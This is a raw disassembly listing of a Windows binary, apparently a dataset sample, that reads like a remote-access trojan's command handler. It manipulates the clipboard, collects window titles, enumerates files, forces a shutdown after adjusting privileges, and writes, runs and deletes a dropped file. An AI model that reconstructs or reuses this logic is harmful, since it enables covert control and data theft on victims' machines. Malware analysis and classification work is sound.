call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4115d9
add esp 0x14
test al al
je r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
jmp r-xdata
call [ EmptyClipboard@IAT ]
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
inc eax
push eax
push 0x2000
call [ GlobalAlloc@IAT ]
push eax
mov [ ebp + 0x8 ] eax
call [ GlobalLock@IAT ]
push ebx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
push [ ebp + 0x8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ ebp - 0x24 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ GlobalUnlock@IAT ]
push [ ebp + 0x8 ]
push 0x1
call [ SetClipboardData@IAT ]
jmp r-xdata
call [ EmptyClipboard@IAT ]
push 0x1
call [ GetClipboardData@IAT ]
mov esi eax
push esi
call [ GlobalLock@IAT ]
push esi
mov edi eax
call [ GlobalUnlock@IAT ]
call [ CloseClipboard@IAT ]
cmp edi ebx
jne r-xdata
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_405cd4
push [ ebp + 0x8 ]
call sub_412390
add esp 0x10
jmp r-xdata
push ebx
mov ecx esi
jmp r-xdata
call sub_402519
jmp r-xdata
call sub_4025c5
jmp r-xdata
lea eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x10 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x3
mov [ ebp - 0x24 ] ebx
call sub_401289
push eax
lea eax [ ebp - 0x364 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_411650
add esp 0xc
lea ecx [ ebp - 0x364 ]
mov esi eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp esi ebx
je r-xdata
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push rw-data
call sub_40e778
jmp r-xdata
mov edi [ FindNextFileW@IAT ]
lea eax [ ebp - 0x808 ]
push eax
push [ ebp - 0x24 ]
lea eax [ ebp - 0x47 ]
lea ecx [ ebp - 0x4a4 ]
push eax
lea eax [ ebp - 0x808 ]
push 0x250
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x4a4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea eax [ ebp - 0x20 ]
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov edi esp
push eax
push esi
push 0x3
call sub_401289
push eax
push esi
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
push esi
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
push esi
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x524 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2e4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x424 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2c4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x4c4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2a4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x404 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push 0x5e
call sub_4024bf
add esp 0x18
lea ecx [ ebp - 0x404 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2a4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x4c4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2c4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x424 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2e4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x524 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi rw-data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea ecx [ ebp - 0x9b8 ]
call sub_402a90
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x284 ]
push eax
lea ecx [ ebp - 0x9b8 ]
call sub_402b93
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_402062
push ebx
push sub_401c6a
mov ecx rw-data
call sub_4020e9
jmp r-xdata
lea ecx [ ebp - 0x20 ]
jmp r-xdata
mov eax [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::npos@IAT ]
lea ecx [ ebp - 0x20 ]
push [ eax ]
push 0x5c
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::rfind@IAT ]
inc eax
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::resize@IAT ]
lea eax [ ebp - 0x20 ]
push 0x2a
push eax
lea eax [ ebp - 0x474 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@G@Z
add esp 0xc
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x474 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x3c ]
mov esi esp
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402dbf
add esp 0x20
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
cmp [ rw-data ] bl
je r-xdata
lea ecx [ ebp - 0x20 ]
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
call sub_407697
add esp 0x10
cmp [ rw-data ] bl
je r-xdata
lea ecx [ ebp - 0x20 ]
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
call sub_407697
add esp 0x10
cmp [ rw-data ] bl
je r-xdata
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
or al 0x1
jmp r-xdata
push eax
call [ ExitWindowsEx@IAT ]
jmp r-xdata
call [ CloseClipboard@IAT ]
sub esp 0x10
lea eax [ ebp - 0x46 ]
mov ecx esp
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x6b
mov ecx rw-data
call sub_402062
jmp r-xdata
mov edi r--data
call sub_402664
jmp r-xdata
push [ ebp + 0x8 ]
push rw-data
call sub_40e778
push [ ebp + 0x8 ]
call [ free@IAT ]
jmp r-xdata
lea eax [ ebp - 0x49 ]
push r--data
push eax
lea eax [ ebp - 0x7dc ]
push eax
lea ecx [ ebp - 0x244 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
call esi
pop ecx
mov [ ebp + 0xb ] al
pop ecx
lea ecx [ ebp - 0x244 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0xb ] bl
je r-xdata
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
mov edi eax
call sub_401289
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
or al 0x2
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x808 ]
push eax
push [ ebp - 0x24 ]
jmp r-xdata
lea eax [ ebp - 0x48 ]
lea ecx [ ebp - 0x3e4 ]
push eax
lea eax [ ebp - 0x808 ]
push 0x250
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x3e4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push ebx
push ebx
push ebx
call edi
test eax eax
je r-xdata
push ebx
push ebx
push 0x1
jmp r-xdata
call edi
jmp r-xdata
sub_40de81
push ebp
mov ebp esp
sub esp 0x2b4
lea eax [ ebp - 0x2b4 ]
push 0x12c
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextW@IAT ]
push [ ebp + 0x8 ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
push 0x1
pop eax
leave
retn 0x8
cmp [ ebp - 0x2b4 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp + 0xb ]
lea ecx [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2b4 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x3c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x5c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_40df6b
push 0x0
push sub_40de81
call [ EnumWindows@IAT ]
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x63
mov ecx rw-data
call sub_402062
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
retn
sub_40dfa5
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x4 ]
push esi
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
lea eax [ ebp - 0x10 ]
xor esi esi
push eax
push r--data
push esi
call [ LookupPrivilegeValueA@IAT ]
push esi
push esi
lea eax [ ebp - 0x14 ]
push esi
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
pop esi
neg eax
leave
retn
sub_40e01a
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_409357
mov ecx [ ebp + 0x8 ]
push 0xc
sub ecx eax
mov eax ecx
pop ecx
cdq
idiv ecx
push [ ebp + 0xc ]
mov ecx edi
push 0x1
push [ ebp + 0x8 ]
mov esi eax
call sub_40e057
mov ecx edi
call sub_409357
lea ecx [ esi + esi * 2 ]
pop edi
pop esi
lea eax [ eax + ecx * 4 ]
pop ebp
retn 0x8
sub_40e057
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push 0xc
mov ecx [ esi + 0x8 ]
mov eax [ esi + 0xc ]
sub eax ecx
pop edi
cdq
idiv edi
mov edi [ ebp + 0xc ]
cmp eax edi
jae r-xdata
mov eax ecx
push 0xc
sub eax [ ebp + 0x8 ]
pop ebx
cdq
idiv ebx
cmp eax edi
jae r-xdata
mov ecx esi
call sub_403e9f
cmp edi eax
jae r-xdata
test edi edi
jbe r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + edi * 2 ]
shl ebx 0x2
lea edx [ ebx + eax ]
push edx
push ecx
push eax
mov ecx esi
call sub_40e1c3
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
push 0xc
cdq
pop ecx
idiv ecx
mov ecx esi
sub edi eax
push edi
push [ esi + 0x8 ]
call sub_40e1ef
push [ ebp + 0x10 ]
push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call sub_40e23e
add esp 0xc
add [ esi + 0x8 ] ebx
jmp r-xdata
mov [ ebp + 0xc ] edi
mov ecx esi
call sub_403e9f
mov [ ebp + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
lea edi [ edi + edi * 2 ]
push ecx
shl edi 0x2
push ecx
sub ecx edi
push ecx
mov ecx esi
call sub_40e1c3
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
push eax
sub eax edi
push eax
push ebx
call sub_40e25f
push [ ebp + 0x10 ]
lea eax [ edi + ebx ]
push eax
push ebx
call sub_40e23e
add esp 0x18
add [ esi + 0x8 ] edi
mov ecx esi
call sub_403e9f
mov ebx eax
push 0x0
add ebx [ ebp + 0xc ]
mov ecx esi
push ebx
call sub_40e217
push eax
mov ecx esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push [ esi + 0x4 ]
call sub_40e1c3
push [ ebp + 0x10 ]
mov ecx esi
mov [ ebp + 0xc ] eax
push edi
push eax
call sub_40e1ef
mov ecx [ ebp + 0xc ]
lea eax [ edi + edi * 2 ]
lea eax [ ecx + eax * 4 ]
mov ecx esi
push eax
push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call sub_40e1c3
push [ esi + 0x8 ]
mov ecx esi
push [ esi + 0x4 ]
call sub_403f1a
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0xc ]
sub eax ecx
push 0xc
cdq
pop ecx
idiv ecx
mov ecx esi
push eax
push [ esi + 0x4 ]
call sub_401b64
lea eax [ ebx + ebx * 2 ]
mov ebx [ ebp - 0x4 ]
mov ecx esi
lea eax [ ebx + eax * 4 ]
mov [ esi + 0xc ] eax
call sub_403e9f
add eax edi
mov [ esi + 0x4 ] ebx
lea eax [ eax + eax * 2 ]
lea eax [ ebx + eax * 4 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
sub_40e1c3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebp
retn 0xc
push esi
mov ecx edi
push [ ebp + 0x10 ]
call sub_40e22a
add [ ebp + 0x10 ] 0xc
add esi 0xc
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_40e1ef
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
test esi esi
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_40e22a
add [ ebp + 0x8 ] 0xc
dec esi
jne r-xdata
sub_40e23e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
pop ebp
retn
push esi
push edi
mov esi [ ebp + 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add eax 0xc
cmp eax [ ebp + 0xc ]
movsd [ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
sub_40e25f
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x8 ] eax
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebp
retn
push esi
push edi
sub [ ebp + 0x10 ] 0xc
sub eax 0xc
mov edi [ ebp + 0x10 ]
mov esi eax
movsd [ edi ] [ esi ]
cmp eax [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
sub_40e287
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jge r-xdata
lea eax [ eax + eax * 2 ]
shl eax 0x2
push eax
call ??2@YAPAXI@Z
pop ecx
pop ebp
retn
xor eax eax
sub_40e2a2
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0xc
call sub_401bd0
pop ecx
test eax eax
pop ecx
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
sub_40e2f0
push ebp
mov ebp esp
push ebx
mov ebx rw-data
push esi
push edi
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2e
mov ecx ebx
call sub_402062
push 0x1
push sub_40e4e9
mov ecx ebx
call sub_4020e9
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40e34b
push ebp
mov ebp esp
sub esp 0xfc
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x70 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push 0x10
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x6f
mov ecx rw-data
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xfc ]
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
pop ecx
pop ecx
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
xor esi esi
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x50 ] 0x3c
mov [ ebp - 0x4c ] 0x40
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x44 ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] 0x1
mov [ ebp - 0x30 ] esi
call [ ShellExecuteExA@IAT ]
test eax eax
setne [ ebp - 0x2 ]
cmp [ ebp - 0x18 ] esi
mov edi rw-data
je r-xdata
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x70
mov ecx edi
call sub_402062
push 0xffffffff
push [ ebp - 0x18 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
lea ecx [ ebp - 0xfc ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
leave
retn
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x6e
mov ecx edi
jmp r-xdata
call sub_402062
sub_40e4e9
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
lea eax [ esi + 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ esi + 0x28 ]
call [ SetEvent@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x20 ]
push [ eax ]
